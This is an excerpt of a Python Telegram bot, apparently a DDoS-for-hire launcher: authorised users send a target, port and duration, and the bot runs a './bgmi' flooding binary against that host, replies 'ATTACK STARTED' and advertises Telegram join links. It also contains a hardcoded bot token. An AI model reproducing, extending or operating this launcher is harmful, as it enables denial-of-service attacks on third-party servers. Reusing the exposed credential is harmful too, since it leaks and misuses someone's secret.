...
bot = telebot.TeleBot('7635879265:AAGBAPDnopDdwjyLfoILyMRyLv4fhne8thk')
...
def start_attack_reply(message, target, port, time):
    ...
    response = f"{username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.🔥🔥\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: https://t.me/+gPzBGyaEhOhmNTA1 "
    bot.reply_to(message, response)
    ...
    if user_id in allowed_user_ids:
        ...
        if len(command) == 4:  # Updated to accept target, time, and port
            ...
            if time > 240:
                ...
                full_command = f"./bgmi {target} {port} {time} 990"
...
✅Join :- https://t.me/+gPzBGyaEhOhmNTA1'''
    bot.reply_to(message, response)
...
3. MAKE SURE YOU JOINED https://t.me/+xpEUyBpR4NQzZTM1 OTHERWISE NOT WORK
